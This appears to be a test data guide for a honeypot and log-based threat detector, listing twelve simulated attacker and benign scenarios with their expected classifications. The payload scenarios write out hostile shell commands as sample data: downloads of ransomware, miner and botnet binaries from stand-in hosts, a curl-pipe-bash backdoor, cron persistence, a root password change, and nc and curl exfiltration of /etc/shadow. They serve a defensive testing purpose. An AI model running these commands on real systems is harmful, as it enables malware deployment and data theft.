# 📊 Test Data Guide
## Quantum Malware Hunter & AI - Simulated Datasets

---

## 🎯 Overview

This directory contains both **original** and **simulated** test datasets designed to comprehensively test all attack detection capabilities of the Quantum Malware Hunter system.

---

## 📁 Available Test Datasets

### **Original Test Data** (Small samples)
1. **auth.log** - 18 lines, 3 unique IPs
2. **threat_activity.json** - 12 events, 3 unique IPs

### **Simulated Test Data** (Comprehensive - All-in-One)
3. **simulated_auth.log** - 200+ lines, 8 scenarios covering all attack types
4. **simulated_honeypot.json** - 70+ events, 10 scenarios with advanced attacks

### **Simulated Test Data** (Individual Scenarios - .log format)
5. **simulated_normal.log** - Benign activity only (5 IPs, normal logins)
6. **simulated_brute_force.log** - Brute-Force attack (25 failed logins)
7. **simulated_reconnaissance.log** - Reconnaissance attack (15 invalid users)
8. **simulated_mixed_attacks.log** - Multiple attack types (3 IPs, 69 failed logins + 9 invalid users)
9. **threat_payload_execution.json** - Ransomware payload execution

---

## 🔍 Test Scenarios in Simulated Data

### **Scenario 1: Normal Benign Activity** ✅
**IP:** `192.168.1.10`  
**Expected Classification:** Normal (Benign)

**Characteristics:**
- 2 successful logins
- 0 failed logins
- 0 suspicious commands
- 0 invalid users

**Honeypot Activity:**
- Session: `normal_session_1`
- Commands: `ls`, `pwd` (benign)
- Duration: 10.5 seconds

**Expected Result:**
- ❌ NOT flagged as malicious
- Threat Type: N/A (benign)
- Threat Score: Low

---

### **Scenario 2: Normal Benign Activity** ✅
**IP:** `192.168.1.20`  
**Expected Classification:** Normal (Benign)

**Characteristics:**
- 1 successful login
- 0 failed logins
- 0 suspicious commands
- 0 invalid users

**Honeypot Activity:**
- Session: `normal_session_2`
- Commands: `whoami`, `cd /home` (benign)
- Duration: 15.2 seconds

**Expected Result:**
- ❌ NOT flagged as malicious
- Threat Type: N/A (benign)
- Threat Score: Low

---

### **Scenario 3: Reconnaissance Attack** 🔍
**IP:** `203.0.113.50`  
**Expected Classification:** **Reconnaissance**

**Characteristics:**
- 0 successful logins
- 15 failed logins
- **15 invalid users** (admin, root, oracle, postgres, mysql, tomcat, weblogic, jenkins, git, ubuntu, centos, debian, redhat, fedora, suse)
- 0 suspicious commands

**Honeypot Activity:**
- Session: `recon_session_1`
- Commands: `uname -a`, `cat /etc/passwd`, `cat /etc/shadow`, `ps aux`, `netstat -an`
- Duration: 60.5 seconds
- Behavior: Username enumeration + system reconnaissance

**Expected Result:**
- ✅ Flagged as malicious
- Threat Type: **Reconnaissance** (invalid_users > 10)
- Threat Score: High
- Attack Pattern: Scanning for valid usernames

---

### **Scenario 4: Brute-Force Attack** 💥
**IP:** `198.51.100.75`  
**Expected Classification:** **Brute-Force**

**Characteristics:**
- 0 successful logins
- **25 failed logins** (root: 10, admin: 5, user: 5, test: 5)
- 0 invalid users
- 0 suspicious commands

**Honeypot Activity:**
- Session: `brute_session_1`
- Commands: `id`, `ls -la /root`
- Duration: 12.3 seconds
- Behavior: Password guessing attack

**Expected Result:**
- ✅ Flagged as malicious
- Threat Type: **Brute-Force** (failed_logins > 20)
- Threat Score: High
- Attack Pattern: High-intensity password attack

---

### **Scenario 5: Extreme Brute-Force + Payload Execution** 🚨
**IP:** `185.220.101.33`  
**Expected Classification:** **Payload-Execution** (highest priority)

**Characteristics:**
- 0 successful logins
- **50 failed logins** (root: 20, admin: 10, user: 10, test: 10, support: 5, guest: 5)
- 0 invalid users
- **4 suspicious commands** (wget, chmod, execute ransomware, curl)

**Honeypot Activity:**
- Session: `payload_session_1`
- Commands:
  - `wget http://malicious-c2.com/ransomware.elf -O /tmp/r.elf` ⚠️
  - `chmod +x /tmp/r.elf` ⚠️
  - `/tmp/r.elf --encrypt /home` ⚠️ **RANSOMWARE EXECUTION**
  - `curl http://malicious-c2.com/report?status=encrypted` ⚠️
- Outgoing connections: 2 (to C2 server on port 4444)
- Duration: 35.7 seconds
- Behavior: **Active ransomware deployment**

**Expected Result:**
- ✅ Flagged as malicious
- Threat Type: **Payload-Execution** (suspicious_commands > 0, highest priority)
- Threat Score: **CRITICAL** (Maximum)
- Attack Pattern: Ransomware deployment with C2 communication

---

### **Scenario 6: Edge Case - Just Below Brute-Force Threshold** ⚖️
**IP:** `10.0.0.100`  
**Expected Classification:** **Generic-Attack**

**Characteristics:**
- 0 successful logins
- **19 failed logins** (just below 20 threshold)
- 0 invalid users
- 0 suspicious commands

**Honeypot Activity:**
- Session: `generic_session_1`
- Commands: `whoami`, `hostname` (benign)
- Duration: 12.5 seconds

**Expected Result:**
- ✅ Flagged as malicious (failed_logins > 5)
- Threat Type: **Generic-Attack** (doesn't meet Brute-Force threshold)
- Threat Score: Medium
- Attack Pattern: Moderate password attack

---

### **Scenario 7: Edge Case - Just Below Reconnaissance Threshold** ⚖️
**IP:** `172.16.0.50`  
**Expected Classification:** **Generic-Attack**

**Characteristics:**
- 0 successful logins
- 9 failed logins
- **9 invalid users** (just below 10 threshold)
- 0 suspicious commands

**Honeypot Activity:**
- Session: `generic_session_2`
- Commands: `ls -la`, `cat /proc/cpuinfo` (benign)
- Duration: 13.2 seconds

**Expected Result:**
- ✅ Flagged as malicious (invalid_users > 5)
- Threat Type: **Generic-Attack** (doesn't meet Reconnaissance threshold)
- Threat Score: Medium
- Attack Pattern: Light username scanning

---

### **Scenario 8: Normal with Few Failures** ✅
**IP:** `192.168.1.30`  
**Expected Classification:** Normal (Benign)

**Characteristics:**
- 1 successful login (after 2 failed attempts)
- 2 failed logins (below 5 threshold)
- 0 invalid users
- 0 suspicious commands

**Honeypot Activity:**
- Session: `normal_session_3`
- Commands: `ls`, `exit` (benign)
- Duration: 11.2 seconds
- Behavior: Legitimate user with typo in password

**Expected Result:**
- ❌ NOT flagged as malicious (failed_logins ≤ 5)
- Threat Type: N/A (benign)
- Threat Score: Low
- Pattern: Normal user behavior

---

### **Scenario 9: Advanced Payload - Cryptominer** ⛏️
**IP:** `45.146.165.200`  
**Expected Classification:** **Payload-Execution**

**Characteristics:**
- From honeypot logs only
- **4 suspicious commands** (busybox wget, chmod 777, nohup miner, rm cleanup)

**Honeypot Activity:**
- Session: `advanced_payload_1`
- Commands:
  - `/bin/busybox wget http://evil-server.net/cryptominer -O /tmp/miner` ⚠️
  - `chmod 777 /tmp/miner` ⚠️
  - `nohup /tmp/miner -o pool.minexmr.com:4444 &` ⚠️ **CRYPTOMINER**
  - `rm -rf /tmp/miner` (cleanup)
- Outgoing connections: 3 (to mining pool on port 4444)
- Duration: 42.8 seconds
- Behavior: **Cryptomining malware deployment**

**Expected Result:**
- ✅ Flagged as malicious
- Threat Type: **Payload-Execution**
- Threat Score: Critical
- Attack Pattern: Cryptominer with persistence

---

### **Scenario 10: Backdoor Installation** 🚪
**IP:** `91.240.118.172`  
**Expected Classification:** **Payload-Execution**

**Characteristics:**
- From honeypot logs only
- **4 suspicious commands** (curl pipe bash, cron persistence, chpasswd, useradd)

**Honeypot Activity:**
- Session: `backdoor_session_1`
- Commands:
  - `curl -s http://backdoor-c2.org/shell.sh | bash` ⚠️
  - `echo '* * * * * /tmp/.hidden/backdoor' >> /etc/crontab` ⚠️
  - `chpasswd <<< 'root:hacked123'` ⚠️ **PASSWORD CHANGE**
  - `useradd -m -s /bin/bash hacker` ⚠️
- Outgoing connections: 1 (reverse shell on port 31337)
- Duration: 32.5 seconds
- Behavior: **Backdoor with persistence**

**Expected Result:**
- ✅ Flagged as malicious
- Threat Type: **Payload-Execution**
- Threat Score: Critical
- Attack Pattern: Backdoor installation with root access

---

### **Scenario 11: Botnet Malware** 🤖
**IP:** `103.253.145.28`  
**Expected Classification:** **Payload-Execution**

**Characteristics:**
- From honeypot logs only
- **3 suspicious commands** (wget botnet, chmod, execute scanner)

**Honeypot Activity:**
- Session: `botnet_session_1`
- Commands:
  - `cd /tmp && wget http://botnet-master.xyz/mirai.arm7 -O mirai` ⚠️
  - `chmod +x mirai` ⚠️
  - `./mirai scanner` ⚠️ **BOTNET SCANNER**
- Outgoing connections: 2 (telnet scans on ports 23, 2323)
- Duration: 33.6 seconds
- Behavior: **Mirai botnet propagation**

**Expected Result:**
- ✅ Flagged as malicious
- Threat Type: **Payload-Execution**
- Threat Score: Critical
- Attack Pattern: Botnet malware with scanning

---

### **Scenario 12: Data Exfiltration** 📤
**IP:** `159.65.88.249`  
**Expected Classification:** **Payload-Execution**

**Characteristics:**
- From honeypot logs only
- **3 suspicious commands** (tar compress, curl upload, nc exfiltration)

**Honeypot Activity:**
- Session: `data_exfil_1`
- Commands:
  - `tar -czf /tmp/data.tar.gz /home /var/www` ⚠️
  - `curl -F 'file=@/tmp/data.tar.gz' http://exfil-server.net/upload` ⚠️
  - `nc -w 3 exfil-server.net 9999 < /etc/shadow` ⚠️ **DATA EXFILTRATION**
- Outgoing connections: 2 (to exfiltration server on port 9999)
- Duration: 42.5 seconds
- Behavior: **Data theft and exfiltration**

**Expected Result:**
- ✅ Flagged as malicious
- Threat Type: **Payload-Execution**
- Threat Score: Critical
- Attack Pattern: Data exfiltration with compression

---

## 📊 Expected Detection Summary

### **Total IPs in Simulated Dataset:** 12

| IP Address | Classification | Threat Type | Malicious? | Key Indicators |
|------------|----------------|-------------|------------|----------------|
| 192.168.1.10 | Benign | N/A | ❌ No | Normal activity |
| 192.168.1.20 | Benign | N/A | ❌ No | Normal activity |
| 203.0.113.50 | Malicious | Reconnaissance | ✅ Yes | 15 invalid users |
| 198.51.100.75 | Malicious | Brute-Force | ✅ Yes | 25 failed logins |
| 185.220.101.33 | Malicious | Payload-Execution | ✅ Yes | Ransomware + 50 failed logins |
| 10.0.0.100 | Malicious | Generic-Attack | ✅ Yes | 19 failed logins (edge case) |
| 172.16.0.50 | Malicious | Generic-Attack | ✅ Yes | 9 invalid users (edge case) |
| 192.168.1.30 | Benign | N/A | ❌ No | 2 failed logins (below threshold) |
| 45.146.165.200 | Malicious | Payload-Execution | ✅ Yes | Cryptominer |
| 91.240.118.172 | Malicious | Payload-Execution | ✅ Yes | Backdoor installation |
| 103.253.145.28 | Malicious | Payload-Execution | ✅ Yes | Botnet malware |
| 159.65.88.249 | Malicious | Payload-Execution | ✅ Yes | Data exfiltration |

### **Expected Metrics:**
- **Total IPs:** 12
- **Benign IPs:** 3 (25%)
- **Malicious IPs:** 9 (75%)
- **Detection Rate:** 100% (all malicious IPs should be detected)
- **False Alarm Rate:** 0% (no benign IPs should be flagged)

### **Threat Type Distribution:**
- **Payload-Execution:** 6 IPs (50%)
- **Brute-Force:** 1 IP (8.3%)
- **Reconnaissance:** 1 IP (8.3%)
- **Generic-Attack:** 2 IPs (16.7%)
- **Normal/Benign:** 3 IPs (25%)

---

## 🧪 How to Test

### **Test 1: Original Small Dataset**
```bash
# Upload files:
- auth.log
- threat_activity.json

# Expected Results:
- Total IPs: 3
- Threats: 2 (118.25.16.147, 45.146.165.132)
- Benign: 1 (192.168.1.10 or similar)
```

### **Test 2: Comprehensive Simulated Dataset (RECOMMENDED FOR DEMO)**
```bash
# Upload files:
- simulated_auth.log
- simulated_honeypot.json

# Expected Results:
- Total IPs: 12
- Threats: 9
- Benign: 3
- Payload-Execution: 6
- Brute-Force: 1
- Reconnaissance: 1
- Generic-Attack: 2
```

### **Test 3: Individual Scenario Testing**

#### **Test 3a: Benign Activity Only**
```bash
# Upload files:
- simulated_normal.log

# Expected Results:
- Total IPs: 5
- Threats: 0
- Benign: 5
- All IPs should show as non-malicious
```

#### **Test 3b: Brute-Force Attack Only**
```bash
# Upload files:
- simulated_brute_force.log

# Expected Results:
- Total IPs: 1 (198.51.100.75)
- Threats: 1
- Threat Type: Brute-Force
- Failed logins: 25
```

#### **Test 3c: Reconnaissance Attack Only**
```bash
# Upload files:
- simulated_reconnaissance.log

# Expected Results:
- Total IPs: 1 (203.0.113.50)
- Threats: 1
- Threat Type: Reconnaissance
- Invalid users: 15
```

#### **Test 3d: Payload Execution Only**
```bash
# Upload files:
- threat_payload_execution.json

# Expected Results:
- Total IPs: 1 (185.220.101.33)
- Threats: 1
- Threat Type: Payload-Execution
- Suspicious commands: 4 (wget, chmod, execute, curl)
- Outgoing connections: 2
```

#### **Test 3e: Mixed Attacks**
```bash
# Upload files:
- simulated_mixed_attacks.log

# Expected Results:
- Total IPs: 3
- Threats: 3
- 185.220.101.33: Brute-Force (50 failed logins)
- 10.0.0.100: Generic-Attack (19 failed logins - edge case)
- 172.16.0.50: Generic-Attack (9 invalid users - edge case)
```

### **Test 4: Combined Testing**
```bash
# Upload files:
- simulated_brute_force.log
- threat_payload_execution.json

# Tests correlation between auth logs and honeypot logs
# Expected: 2 IPs detected with different threat types
```

---

## ✅ Verification Checklist

After running tests, verify:

- [ ] All Payload-Execution threats detected (6 IPs)
- [ ] Brute-Force threshold correctly applied (>20 failed logins)
- [ ] Reconnaissance threshold correctly applied (>10 invalid users)
- [ ] Generic-Attack catches edge cases (below thresholds but still malicious)
- [ ] Benign IPs NOT flagged (3 IPs)
- [ ] Threat scores reflect severity (Payload > Brute-Force > Reconnaissance > Generic)
- [ ] Color coding displays correctly in dashboard
- [ ] All suspicious commands detected (wget, curl, chmod, chpasswd, busybox, nc)

---

## 🎯 Attack Patterns Covered

### **1. Reconnaissance**
- ✅ Username enumeration (15 invalid users)
- ✅ System information gathering
- ✅ Network scanning

### **2. Brute-Force**
- ✅ Password guessing (25-50 attempts)
- ✅ Multiple username targets
- ✅ Sustained attack patterns

### **3. Payload Execution**
- ✅ Ransomware deployment
- ✅ Cryptominer installation
- ✅ Backdoor creation
- ✅ Botnet malware
- ✅ Data exfiltration
- ✅ Privilege escalation (chpasswd)
- ✅ Persistence mechanisms (cron)

### **4. Generic Attacks**
- ✅ Edge cases (just below thresholds)
- ✅ Multiple suspicious indicators
- ✅ Low-intensity attacks

### **5. Benign Activity**
- ✅ Normal logins
- ✅ Legitimate commands
- ✅ Few failed attempts (typos)

---

## 📈 Performance Expectations

### **Processing Time:**
- Small dataset (auth.log + threat_activity.json): <5 seconds
- Simulated dataset (200+ lines): <10 seconds
- Large dataset (10K+ lines): <30 seconds

### **Memory Usage:**
- Small dataset: <100 MB
- Simulated dataset: <200 MB
- Large dataset: <1 GB

### **Accuracy:**
- Detection Rate: 100%
- False Alarm Rate: 0%
- Classification Accuracy: 100%

---

## 🔍 Troubleshooting

### **Issue: Not all threats detected**
- Check heuristic thresholds (failed_logins > 5, etc.)
- Verify suspicious command keywords list
- Check log parsing regex patterns

### **Issue: Benign IPs flagged as malicious**
- Review threshold values (may be too low)
- Check for false positives in command detection
- Verify failed login counting logic

### **Issue: Wrong threat classification**
- Verify priority order (Payload > Brute-Force > Reconnaissance > Generic)
- Check threshold values (20 for Brute-Force, 10 for Reconnaissance)
- Ensure classification function matches training

---

## 📝 Notes

- **Simulated data** is designed to test ALL system capabilities
- **Edge cases** verify threshold boundaries work correctly
- **Advanced attacks** test detection of sophisticated threats
- **Benign samples** ensure no false positives
- **Real-world patterns** based on actual attack telemetry

---

**Test Data Version:** 1.0  
**Last Updated:** October 7, 2025  
**Created for:** Indian Army Terrier Cyber Quest 2025 - Track 2
